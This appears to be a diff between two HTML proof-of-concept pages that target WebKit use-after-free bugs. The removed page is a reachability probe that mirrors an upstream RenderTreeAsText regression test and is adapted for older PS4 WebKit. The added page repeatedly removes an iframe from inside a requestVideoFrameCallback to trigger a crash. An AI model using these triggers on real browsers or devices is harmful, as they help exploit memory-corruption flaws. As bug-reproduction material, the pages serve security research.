@@ -1,224 +1,200 @@
-<!doctype html>
+<!DOCTYPE html>
+<html>
+<head>
 <meta charset="utf-8">
-<title>WebKit RenderTreeAsText UAF - production reachability probe</title>
+<title>RVFC iframe removal test</title>
 
 <style>
-  iframe {
-    content: url();
-    zoom: 0.01;
-    width: 700px;
-    height: 450px;
-    border: 2px solid red;
-  }
+body {
+    background: #111;
+    color: #eee;
+    font-family: monospace;
+}
 
-  #status {
-    position: fixed;
-    top: 0;
-    left: 0;
-    z-index: 99999;
-    background: white;
-    border: 1px solid black;
-    padding: 6px;
-    font: 14px monospace;
-  }
+#log {
+    white-space: pre-wrap;
+    border: 1px solid #555;
+    padding: 10px;
+    margin-top: 20px;
+}
 
-  #work {
-    margin-top: 45px;
-    width: 900px;
-    min-height: 1200px;
-  }
-
-  .box {
-    width: 800px;
-    height: 280px;
-    margin: 20px;
-    border: 2px solid #777;
-  }
+iframe {
+    width: 320px;
+    height: 240px;
+    border: 1px solid #888;
+}
 </style>
+</head>
 
-<div id="status">BOOT</div>
+<body>
 
-<div id="work">
-  <div class="box" id="box">
-    <iframe id="i0" tabindex="0"></iframe>
-  </div>
+<h2>RVFC iframe removal test</h2>
 
-  <div class="box">
-    <div id="content">RenderTree baseline</div>
-  </div>
-</div>
+<div id="status">Initializing...</div>
+<div id="log"></div>
 
 <script>
+
 (function () {
+
     var status = document.getElementById("status");
-    var i0 = document.getElementById("i0");
-    var box = document.getElementById("box");
-    var content = document.getElementById("content");
+    var logElement = document.getElementById("log");
 
-    var log = [];
-
-    function mark(s) {
-        log.push(s);
-        status.textContent = log.join(" | ");
+    function log(message) {
+        console.log(message);
+        logElement.textContent += message + "\n";
     }
 
-    function layout() {
-        document.documentElement.offsetHeight;
-        document.body.offsetHeight;
+    var testCount = 0;
+    var maxTests = 10;
+    var currentFrame = null;
+    var waitingResolve = null;
 
-        if (box)
-            box.getBoundingClientRect();
+    /*
+     * Verifica se o navegador possui requestVideoFrameCallback.
+     *
+     * Sem essa API, o caminho específico corrigido pelo
+     * commit fe980da não pode ser alcançado por JavaScript.
+     */
 
-        if (i0)
-            i0.getBoundingClientRect();
+    var testVideo = document.createElement("video");
 
-        content.getBoundingClientRect();
+    if (typeof testVideo.requestVideoFrameCallback !== "function") {
+        status.textContent = "RVFC NOT SUPPORTED";
+        log("ERROR: requestVideoFrameCallback is not available.");
+        log("This browser cannot directly execute the target path.");
+        return;
+    }
+
+    log("requestVideoFrameCallback: SUPPORTED");
+
+    /*
+     * Cria um iframe.
+     *
+     * O iframe contém o HTMLVideoElement e os callbacks RVFC.
+     */
+
+    function createFrame() {
+
+        return new Promise(function(resolve) {
+
+            var frame = document.createElement("iframe");
+
+            frame.onload = function() {
+                resolve(frame);
+            };
+
+            frame.src = "05.html";
+
+            document.body.appendChild(frame);
+
+        });
     }
 
     /*
-     * This deliberately mirrors the important DOM shape of
-     * LayoutTests/fast/rendering/render-tree-as-text-uaf.html:
+     * Chamado pelo iframe durante um VideoFrameCallback.
      *
-     *   iframe { content: url(); zoom: 0.01 }
-     *   frameset insertion
-     *   focus handler
-     *   hash navigation
-     *   asynchronous focus
+     * Este é o equivalente ao:
      *
-     * The test-only calls (internals / testRunner) are omitted.
+     *     frame.remove();
+     *
+     * do teste original.
      */
 
-    mark("DOM_READY");
+    window.removeTargetFrame = function() {
 
-    /*
-     * Give the iframe a stable browsing context first.
-     */
-    try {
-        i0.src = "about:blank";
-        mark("IFRAME_CREATED");
-    } catch (e) {
-        mark("IFRAME_CREATE_ERROR");
-    }
+        log(">>> removeTargetFrame() called from RVFC");
 
-    setTimeout(function () {
+        if (currentFrame) {
 
-        layout();
-        mark("BASELINE_LAYOUT");
-
-        /*
-         * Same frameset mutation as the upstream regression test.
-         * It is intentionally kept to one mutation.
-         */
-        try {
-            document.documentElement.appendChild(
-                document.createElement("frameset")
-            );
-            mark("FRAMESET_ADDED");
-        } catch (e) {
-            mark("FRAMESET_ERROR");
-        }
-
-        /*
-         * Same focus callback semantics as the upstream test.
-         * We record the event rather than immediately destroying
-         * unrelated DOM.
-         */
-        i0.onfocus = function () {
-            mark("IFRAME_FOCUS");
-
-            try {
-                location.hash = "y";
-                mark("HASH_Y");
-            } catch (e) {
-                mark("HASH_ERROR");
-            }
+            var frameToRemove = currentFrame;
 
             /*
-             * Force the renderer to process the state change.
-             */
-            layout();
-            mark("FOCUS_LAYOUT");
-        };
-
-        /*
-         * Match the original test's hash transition.
-         */
-        try {
-            location.hash = "x";
-            mark("HASH_X");
-        } catch (e) {
-            mark("HASH_X_ERROR");
-        }
-
-        /*
-         * The original test uses a data:text/javascript script to
-         * schedule i0.focus() after a promise/cache operation.
-         *
-         * We avoid Cache API dependency because older PS4 WebKit
-         * may not implement it. Promise is sufficient as a
-         * microtask scheduling primitive.
-         */
-        try {
-            var script = document.createElement("script");
-
-            script.text =
-                "Promise.resolve().then(function() {" +
-                "  var f = document.getElementById('i0');" +
-                "  if (f) f.focus();" +
-                "});";
-
-            document.head.appendChild(script);
-            mark("ASYNC_FOCUS_SCHEDULED");
-        } catch (e) {
-            mark("ASYNC_FOCUS_ERROR");
-
-            /*
-             * Fallback for very old JS implementations.
-             */
-            setTimeout(function () {
-                if (i0)
-                    i0.focus();
-            }, 0);
-        }
-
-        /*
-         * Give the microtask/focus path time to execute.
-         */
-        setTimeout(function () {
-
-            layout();
-            mark("POST_FOCUS_LAYOUT");
-
-            /*
-             * Probe the only normal web-content API that might be
-             * associated with a print representation path.
+             * Remove imediatamente o iframe.
              *
-             * This does NOT prove RenderTreeAsText was reached.
+             * Isto força a destruição/navegação do documento
+             * que contém o HTMLVideoElement.
              */
-            setTimeout(function () {
 
-                mark("PRINT_CALL");
+            frameToRemove.remove();
 
-                try {
-                    window.print();
-                    mark("PRINT_RETURNED");
-                } catch (e) {
-                    mark("PRINT_EXCEPTION");
-                }
+            currentFrame = null;
 
-                /*
-                 * Final observation window.
-                 */
-                setTimeout(function () {
-                    layout();
-                    mark("FINAL_LAYOUT");
-                }, 1000);
+            log(">>> iframe removed");
 
-            }, 500);
+        }
 
-        }, 500);
+        if (waitingResolve) {
 
-    }, 700);
+            var resolve = waitingResolve;
+            waitingResolve = null;
+
+            resolve();
+        }
+    };
+
+    function waitForRemoval() {
+
+        return new Promise(function(resolve) {
+            waitingResolve = resolve;
+        });
+
+    }
+
+    async function runTest() {
+
+        for (testCount = 1; testCount <= maxTests; testCount++) {
+
+            status.textContent =
+                "Running iteration " +
+                testCount +
+                " / " +
+                maxTests;
+
+            log("");
+            log("=================================");
+            log("Iteration " + testCount);
+            log("Creating iframe...");
+
+            currentFrame = await createFrame();
+
+            log("Iframe loaded.");
+            log("Waiting for RVFC-triggered removal...");
+
+            await waitForRemoval();
+
+            log("Iteration " + testCount + " completed.");
+
+            /*
+             * Pequena pausa entre iterações.
+             */
+
+            await new Promise(function(resolve) {
+                setTimeout(resolve, 100);
+            });
+
+        }
+
+        status.textContent = "TEST COMPLETED";
+
+        log("");
+        log("=================================");
+        log("All iterations completed.");
+        log("If the browser did not crash, the test finished.");
+
+    }
+
+    /*
+     * Inicia automaticamente.
+     */
+
+    setTimeout(function() {
+        runTest();
+    }, 500);
 
 })();
+
 </script>
+
+</body>
+</html>
